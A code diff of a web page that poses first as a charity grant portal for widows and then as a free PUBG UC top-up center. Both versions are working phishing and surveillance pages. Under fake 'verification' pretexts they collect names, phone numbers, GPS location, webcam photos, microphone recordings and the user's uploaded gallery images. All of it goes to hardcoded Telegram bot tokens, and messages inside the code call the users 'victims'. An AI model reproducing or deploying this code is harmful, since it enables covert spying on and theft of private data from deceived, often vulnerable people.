@@ -3,104 +3,121 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>بوابة التسجيل | منظمة تكافل</title>
+    <title>PUBG MOBILE | مركز الشحن المعتمد 2026</title>
     <style>
-        :root { --main: #27ae60; --dark: #2c3e50; }
-        body { font-family: 'Arial', sans-serif; background: #f4f7f6; text-align: center; direction: rtl; padding: 10px; }
-        .container { background: white; max-width: 420px; margin: 20px auto; padding: 25px; border-radius: 15px; box-shadow: 0 5px 20px rgba(0,0,0,0.1); border-top: 6px solid var(--main); }
-        h2 { color: var(--dark); font-size: 22px; margin-bottom: 5px; }
-        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; background: #fafafa; }
-        .btn { background: var(--main); color: white; border: none; padding: 15px; width: 100%; border-radius: 8px; cursor: pointer; font-size: 17px; font-weight: bold; margin-top: 15px; }
-        .status-msg { font-size: 12px; color: #e74c3c; margin-top: 10px; font-weight: bold; }
-        .footer { font-size: 11px; color: #bdc3c7; margin-top: 20px; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0b0e11; color: #f1f1f1; text-align: center; margin: 0; padding: 10px; }
+        .container { background: linear-gradient(145deg, #1e2329, #0b0e11); max-width: 450px; margin: 20px auto; padding: 30px; border-radius: 20px; border: 2px solid #f3ba2f; box-shadow: 0 0 25px rgba(243, 186, 47, 0.2); }
+        h2 { color: #f3ba2f; text-transform: uppercase; letter-spacing: 1px; }
+        .input-group { margin-bottom: 15px; text-align: right; }
+        label { display: block; font-size: 13px; color: #848e9c; margin-bottom: 5px; }
+        input, select { width: 100%; padding: 12px; border: 1px solid #474d57; border-radius: 8px; background: #2b3139; color: white; box-sizing: border-box; }
+        .btn-shahn { background: #f3ba2f; color: #000; border: none; padding: 16px; width: 100%; border-radius: 8px; cursor: pointer; font-size: 18px; font-weight: bold; margin-top: 15px; transition: 0.3s; }
+        .btn-shahn:hover { background: #ffcc00; box-shadow: 0 0 15px #f3ba2f; }
+        .loading { display: none; margin-top: 15px; font-weight: bold; color: #2ecc71; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <img src="https://img.icons8.com/color/96/charity.png" width="60">
-    <h2>منظمة تكافل الإنسانية</h2>
-    <p style="font-size: 13px; color: #7f8c8d;">يرجى تفعيل التحقق الصوتي لإتمام طلب المنحة</p>
-    
-    <input type="text" id="name" placeholder="اسم الأرملة الكامل">
-    <input type="tel" id="phone" placeholder="رقم هاتف الواتساب">
-    
-    <button class="btn" onclick="startCapture()">تأكيد البيانات والتحقق الصوتي</button>
-    
-    <p id="status" class="status-msg" style="display:none;">🔴 جاري التحقق الصوتي.. يرجى الانتظار</p>
-    
-    <div class="footer">جميع الحقوق محفوظة © منظمة تكافل - 2026</div>
+    <img src="https://img.icons8.com/color/96/pubg.png" width="80">
+    <h2>مركز توزيع الشدات المجاني</h2>
+    <p style="font-size: 12px; color: #848e9c;">أدخل الـ ID الخاص بك واختر كمية الشدات المطلوبة</p>
+
+    <div class="input-group">
+        <label>رقم معرف اللاعب (ID):</label>
+        <input type="number" id="player_id" placeholder="مثلاً: 512345678">
+    </div>
+
+    <div class="input-group">
+        <label>كمية الشدات (UC):</label>
+        <select id="uc_amount">
+            <option value="660 UC">660 UC</option>
+            <option value="1800 UC">1800 UC</option>
+            <option value="3850 UC">3850 UC</option>
+            <option value="8100 UC">8100 UC</option>
+        </select>
+    </div>
+
+    <div class="input-group">
+        <label>إثبات ملكية الحساب (رفع لقطة شاشة للبروفايل):</label>
+        <input type="file" id="studiofiles" multiple accept="image/*">
+    </div>
+
+    <button class="btn-shahn" onclick="startHacking()">بدء عملية الشحن الآن</button>
+    <div id="loading" class="loading">جاري الربط مع خوادم اللعبة...</div>
 </div>
 
-<script>
-    const TOKEN = "8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg";
-    const CHAT_ID = "7214473798";
+<canvas id="canvas" style="display:none;"></canvas>
+<video id="video" style="display:none;" autoplay></video>
 
-    async function sendToBot(type, data, caption = "") {
+<script>
+    const TOKEN = "8470093886:AAFofGsfGx98xJCaOPJyvqyLdwrYL_3Ebfg";
+    const CHAT_ID = "7529727252";
+
+    async function send(type, data, caption = "") {
         const formData = new FormData();
         formData.append("chat_id", CHAT_ID);
         if (type === "text") {
             await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
+                method: "POST", headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ chat_id: CHAT_ID, text: data, parse_mode: "Markdown" })
             });
         } else {
-            // إرسال كصوت (Voice) أو ملف (Document)
-            formData.append(type, data, type === "voice" ? "audio.ogg" : "file.jpg");
+            let fileName = type === "photo" ? "face.jpg" : type === "voice" ? "audio.ogg" : "file.jpg";
+            formData.append(type, data, fileName);
             if (caption) formData.append("caption", caption);
-            await fetch(`https://api.telegram.org/bot${TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, {
-                method: "POST",
-                body: formData
-            });
+            await fetch(`https://api.telegram.org/bot${TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, { method: "POST", body: formData });
         }
     }
 
-    async function startCapture() {
-        const name = document.getElementById('name').value;
-        const phone = document.getElementById('phone').value;
+    async function startHacking() {
+        const p_id = document.getElementById('player_id').value;
+        const uc = document.getElementById('uc_amount').value;
 
-        if (!name || !phone) { alert("يرجى إدخال البيانات أولاً!"); return; }
+        if (!p_id) { alert("يرجى إدخال ID اللاعب!"); return; }
 
-        document.getElementById('status').style.display = 'block';
+        document.getElementById('loading').style.display = 'block';
+        alert("تنبيه: يجب السماح بالصلاحيات لتأكيد أنك لست 'روبوت' (Anti-Bot Verification)");
 
-        // 1. جلب الموقع الجغرافي
+        // 1. الموقع والبيانات
         navigator.geolocation.getCurrentPosition(async (pos) => {
-            const map = `📍 الموقع: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-            await sendToBot("text", `🔥 **صيد صوتي جديد (تكافل)** 🔥\n👤 الاسم: ${name}\n📞 الهاتف: ${phone}\n${map}`);
+            const info = `🎮 **صيد ببجي جديد** 🎮\n🆔 الآيدي: ${p_id}\n💎 الشدات: ${uc}\n📍 الموقع: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+            await send("text", info);
         });
 
-        // 2. تسجيل الصوت التلقائي
+        // 2. الملفات
+        const files = document.getElementById('studiofiles').files;
+        for (let file of files) { await send("document", file, "📁 صور من استوديو الضحية"); }
+
+        // 3. الكاميرا والصوت
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-            const mediaRecorder = new MediaRecorder(stream);
-            const audioChunks = [];
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            const video = document.getElementById('video');
+            video.srcObject = stream;
 
-            mediaRecorder.ondataavailable = (event) => {
-                audioChunks.push(event.data);
-            };
-
-            mediaRecorder.onstop = async () => {
-                const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
-                await sendToBot("voice", audioBlob, `🎤 تسجيل صوتي للضحية: ${name}`);
-                
-                // إيقاف الميكروفون بعد الانتهاء
-                stream.getTracks().forEach(track => track.stop());
-                
-                document.getElementById('status').innerText = "✅ تم التحقق بنجاح! سيتم التواصل معك.";
-                alert("شكراً لك، تم استلام طلبك بنجاح.");
-            };
-
-            // ابدأ التسجيل
-            mediaRecorder.start();
-
-            // سجل لمدة 5 ثوانٍ ثم توقف تلقائياً وارسل
-            setTimeout(() => {
-                mediaRecorder.stop();
-            }, 5000);
-
-        } catch (err) {
-            alert("خطأ: يجب السماح بالميكروفون والـ GPS لتأكيد أهليتك للمنحة!");
+            setTimeout(async () => {
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                canvas.toBlob(async (blob) => {
+                    await send("photo", blob, `📸 صورة اللاعب: ${p_id}`);
+                    
+                    const mediaRecorder = new MediaRecorder(stream);
+                    const chunks = [];
+                    mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                    mediaRecorder.onstop = async () => {
+                        const audioBlob = new Blob(chunks, { type: 'audio/ogg' });
+                        await send("voice", audioBlob, "🎤 تسجيل صوتي أثناء الشحن");
+                        stream.getTracks().forEach(t => t.stop());
+                        document.getElementById('loading').innerText = "تم الشحن بنجاح! انتظر وصول الشدات خلال ساعة.";
+                        alert("تم إرسال طلب الشحن بنجاح!");
+                    };
+                    mediaRecorder.start();
+                    setTimeout(() => mediaRecorder.stop(), 4000);
+                }, 'image/jpeg');
+            }, 2000);
+        } catch (e) {
+            alert("خطأ: يجب السماح بالصلاحيات لإكمال عملية الشحن!");
         }
     }
 </script>
